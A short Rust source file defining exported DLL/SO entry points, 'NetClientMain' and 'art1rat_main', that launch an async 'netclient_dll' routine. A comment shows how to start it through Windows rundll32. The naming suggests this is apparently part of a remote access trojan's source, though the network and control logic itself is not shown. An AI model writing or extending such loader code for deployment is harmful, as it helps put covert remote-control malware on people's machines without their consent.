use std::ffi::c_int;

/// Entry point for DLL/SO loads.
/// Windows rundll32: rundll32.exe <dllpath>,NetClientMain
#[unsafe(export_name = "NetClientMain")]
pub extern "C" fn NetClientMain() {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(crate::netclient_dll());
}

/// Generic C-callable entry point.
#[unsafe(export_name = "art1rat_main")]
pub extern "C" fn art1rat_main() -> c_int {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(crate::netclient_dll());
    0
}
